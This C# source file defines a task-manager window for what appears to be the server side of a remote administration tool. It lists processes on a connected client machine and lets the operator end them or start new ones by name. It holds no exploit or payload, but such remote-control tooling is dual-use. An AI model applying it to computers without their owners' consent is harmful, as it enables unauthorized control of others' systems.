using Common.Enums;
using Common.Models;
using Server.Extensions;
using Server.Helper;
using Server.Networking;
using Server.Networking.Handlers;
using Server.Utilities;

namespace Server.Forms
{
    public partial class FrmTaskManager : Form
    {
        private static readonly Dictionary<Client, FrmTaskManager> OpenedForms = new Dictionary<Client, FrmTaskManager>();

        public static FrmTaskManager CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.ContainsKey(client))
            {
                return OpenedForms[client];
            }
            FrmTaskManager f = new FrmTaskManager(client);
            f.Disposed += (sender, args) => OpenedForms.Remove(client);
            OpenedForms.Add(client, f);
            return f;
        }

        private Client _connectClient;
        private readonly TaskManagerHandler _taskManagerHandler;

        public FrmTaskManager(Client client)
        {
            _connectClient = client;

            _taskManagerHandler = client.ClientHandler.TaskManagerHandler;

            RegisterMessageHandler();
            InitializeComponent();
        }

        private void RegisterMessageHandler()
        {
            _connectClient.Disconnected += ClientDisconnected;
            _taskManagerHandler.TaskManagerEvent += TaskManagerChanged;
            _taskManagerHandler.ProcessActionPerformed += ProcessActionPerformed;
        }
        private void UnregisterMessageHandler()
        {
            _connectClient.Disconnected -= ClientDisconnected;
            _taskManagerHandler.TaskManagerEvent -= TaskManagerChanged;
            _taskManagerHandler.ProcessActionPerformed -= ProcessActionPerformed;
        }

        private void ClientDisconnected(Client client)
        {
            this.Invoke((MethodInvoker)this.Close);
        }

        private void TaskManagerChanged(object sender, List<Process> processes)
        {
            lstTasks.Invoke(() =>
            {
                lstTasks.Items.Clear();

                foreach (var process in processes)
                {
                    lstTasks.Items.Add(new ListViewItem(new[] { process.Name, process.Id.ToString(), process.MainWindowTitle }));
                }

                processesToolStripStatusLabel.Text = $"Processes: {processes.Count()}";
            });
        }

        private void ProcessActionPerformed(object sender, ProcessAction action, bool result)
        {
            string text = string.Empty;
            switch (action)
            {
                case ProcessAction.Start:
                    text = result ? "Process started successfully" : "Failed to start process";
                    break;
                case ProcessAction.End:
                    text = result ? "Process ended successfully" : "Failed to end process";
                    break;
            }

            processesToolStripStatusLabel.Text = text;
        }

        private void FrmTaskManager_Load(object sender, EventArgs e)
        {
            this.Text = WindowHelper.GetWindowTitle("Task Manager", _connectClient);
            _taskManagerHandler.GetProcesses();
        }

        private void FrmTaskManager_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
        }

        private void killProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            foreach (ListViewItem lvi in lstTasks.SelectedItems)
            {
                _taskManagerHandler.EndProcess(int.Parse(lvi.SubItems[1].Text));
            }
        }

        private void startProcessToolStripMenuItem_Click(object sender, EventArgs e)
        {
            string processName = string.Empty;
            if (InputBox.Show("Process name", "Enter Process name:", ref processName) == DialogResult.OK)
            {
                _taskManagerHandler.StartProcess(processName);
            }
        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            _taskManagerHandler.GetProcesses();
        }
    }
}
